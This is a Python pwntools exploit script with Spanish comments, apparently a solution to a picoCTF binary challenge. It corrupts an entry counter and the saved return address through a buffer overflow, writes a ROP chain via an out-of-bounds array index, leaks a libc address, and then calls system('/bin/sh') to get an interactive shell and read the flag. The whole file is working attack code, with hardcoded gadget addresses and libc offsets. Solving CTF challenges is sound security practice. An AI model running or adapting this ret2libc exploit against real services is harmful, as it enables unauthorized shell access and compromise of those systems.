#!/usr/bin/env python3
"""
ESTRATEGIA FINAL:

1. Fase 1: Setup
   - Agregar 10 entradas (máximo permitido)
   - Usar feedback overflow para:
     * Establecer total_entries a un valor alto (ej. 20)
     * Establecer return address a vuln() para reiniciar
     
2. Fase 2: ROP chain
   - Ahora total_entries = 20, puedo usar índices 0-19
   - Usar índice 10 o mayor para escribir MÁS ALLÁ del stack frame actual
   - entries[11].msg empieza en rbp+64, puedo escribir ROP chain completo
   - Salir para trigger el ROP chain

3. ROP chain:
   - Leak libc con puts(puts@got)
   - Return a main o vuln
   - Calcular system() y "/bin/sh"
   - Segunda pasada: system("/bin/sh")
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = 'shape-facility.picoctf.net'
PORT = 63529

# Direcciones (No PIE)
vuln_addr = 0x401229
pop_rdi = 0x4014b3
puts_plt = 0x4010a0
puts_got = 0x404018
main_addr = 0x40140f

io = remote(HOST, PORT)

log.info("=== FASE 1: SETUP Y MANIPULAR TOTAL_ENTRIES ===")

# Agregar 10 entradas para llenar el array
for i in range(10):
    io.sendlineafter(b'Exit the app\n', b'1')
    io.sendlineafter(b'name: \n', f'e{i}'.encode())

# Usar feedback overflow para manipular total_entries y return address
# Layout:
# [0-7]: feedback (8 bytes) - puede ser basura
# [8-11]: total_entries (4 bytes) - establecer a 20
# [12-19]: saved_rbp (8 bytes) - puede ser basura
# [20-27]: return_address (8 bytes) - vuln_addr para regresar

payload1 = b'A' * 8                    # feedback
payload1 += p32(20)                     # total_entries = 20
payload1 += b'B' * 8                    # saved_rbp
payload1 += p64(vuln_addr)              # return to vuln()

assert len(payload1) <= 32

io.sendlineafter(b'Exit the app\n', b'3')
io.sendlineafter(b'appreciate it: \n', payload1)

log.info("=== FASE 2: COLOCAR ROP CHAIN CON ÍNDICE FUERA DE BOUNDS ===")

# Ahora estamos de vuelta en vuln() con total_entries = 20
# Calcular qué índice usar para escribir el ROP chain

# Necesito que entries[i].msg sobrescriba el return address
# Return address está en rbp+8
# entries[i].msg está en rbp + (-728 + i*72)
# Queremos: -728 + i*72 <= 8 y -728 + i*72 + 64 > 8

# Resolviendo: i*72 >= 736 -> i >= 10.22
# Con i=11: msg está en rbp + (-728 + 11*72) = rbp + 64
# Eso está después del ret, no antes...

# Necesito que msg INCLUYA el return address
# i=10: msg en rbp-8 a rbp+55 (incluye return address en rbp+8) ✓

# Pero el check es choice >= total_entries
# Con total_entries = 20, choice puede ser 0-19, así que 10 es válido!

io.sendlineafter(b'Exit the app\n', b'2')
io.sendlineafter(b'message to?\n', b'10')

# Construir ROP chain para leak de libc
# entries[10].msg empieza en rbp-8
# Return address está en rbp+8
# Offset: 8 - (-8) = 16 bytes

rop_leak = b'C' * 16                   # Padding hasta return address
rop_leak += p64(pop_rdi)               # pop rdi; ret
rop_leak += p64(puts_got)              # rdi = puts@got
rop_leak += p64(puts_plt)              # call puts(puts@got)
rop_leak += p64(vuln_addr)             # return to vuln for round 2

assert len(rop_leak) <= 64

io.sendlineafter(b'send them?\n', rop_leak)

# Salir para trigger el ROP
io.sendlineafter(b'Exit the app\n', b'3')
io.sendlineafter(b'appreciate it: \n', b'trigger')

log.info("=== RECIBIENDO LEAK DE LIBC ===")

try:
    leaked = io.recvline()
    log.info(f"Leak line: {leaked[:50]}")
    
    if len(leaked) >= 6:
        puts_leak = u64(leaked[:6].ljust(8, b'\x00'))
        log.success(f"Leaked puts@libc: {hex(puts_leak)}")
        
        # Offsets para Ubuntu 22.04 libc 2.35-0ubuntu3
        puts_offset = 0x80e50
        system_offset = 0x50d70
        binsh_offset = 0x1d8698
        
        libc_base = puts_leak - puts_offset
        system_addr = libc_base + system_offset
        binsh_addr = libc_base + binsh_offset
        
        log.info(f"Libc base: {hex(libc_base)}")
        log.info(f"system: {hex(system_addr)}")
        log.info(f"/bin/sh: {hex(binsh_addr)}")
        
        log.info("=== FASE 3: OBTENER SHELL ===")
        
        # Estamos de vuelta en vuln() con total_entries desconocido
        # Repetir el setup: manipular total_entries de nuevo
        for i in range(10):
            io.sendlineafter(b'Exit the app\n', b'1')
            io.sendlineafter(b'name: \n', f'x{i}'.encode())
        
        payload2 = b'D' * 8 + p32(20) + b'E' * 8 + p64(vuln_addr)
        io.sendlineafter(b'Exit the app\n', b'3')
        io.sendlineafter(b'appreciate it: \n', payload2)
        
        # Colocar ROP chain para system("/bin/sh")
        io.sendlineafter(b'Exit the app\n', b'2')
        io.sendlineafter(b'message to?\n', b'10')
        
        ret_gadget = 0x40101a  # ret simple para alineación
        
        rop_shell = b'F' * 16
        rop_shell += p64(ret_gadget)      # Alineación del stack
        rop_shell += p64(pop_rdi)
        rop_shell += p64(binsh_addr)
        rop_shell += p64(system_addr)
        
        io.sendlineafter(b'send them?\n', rop_shell)
        
        io.sendlineafter(b'Exit the app\n', b'3')
        io.sendlineafter(b'appreciate it: \n', b'SHELL')
        
        log.success("¡Shell obtenida!")
        
        # Buscar flag
        io.sendline(b'ls -la')
        io.sendline(b'cat flag.txt')
        io.sendline(b'find / -name "flag*" 2>/dev/null | head')
        
        io.interactive()
        
except Exception as e:
    log.error(f"Error: {e}")
    import traceback
    traceback.print_exc()
finally:
    io.close()
